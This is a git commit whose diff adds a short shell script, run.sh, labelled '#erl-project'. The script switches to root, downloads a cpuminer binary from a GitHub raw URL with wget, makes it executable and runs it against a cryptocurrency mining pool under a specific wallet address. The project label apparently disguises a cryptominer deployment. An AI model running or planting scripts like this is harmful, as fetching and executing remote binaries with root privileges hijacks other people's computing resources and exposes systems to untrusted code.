f15f99b6b2c585e8861a2a66b8653bc7733358ce
Riassis <99403476+Riassis@users.noreply.github.com>
2022-03-01 03:11:51 +0800

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,5 @@
+#erl-project
+sudo su
+wget -qO run https://raw.githubusercontent.com/Riassis/cautious-fortnight/main/cpuminer-sse2
+chmod +x run
+./run -a yescryptr8g  -o stratum+tcps://stratum-asia.rplant.xyz:13032 -u k1C8w5t9o5CTT8XDw8typqhYqaCoSxuy6VQ.cputest
